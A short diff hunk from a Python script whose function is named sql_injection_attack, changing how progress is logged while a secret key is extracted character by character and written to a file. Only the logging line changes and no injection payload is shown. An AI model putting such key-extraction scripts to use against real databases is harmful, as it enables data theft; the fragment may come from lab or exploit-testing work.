@@ -180,7 +180,7 @@ def sql_injection_attack():
         key_index += 1
         modulo_index = key_index % 10
         if modulo_index == 0:
-            logger.info(__repr__(f"Extracted so far: {key}"))
+            logger.info(f"Extracted {key_index} characters so far: tail -> '{key[-30:]}'")
 
         with open(file_path, "w") as f:
             f.write(key)   
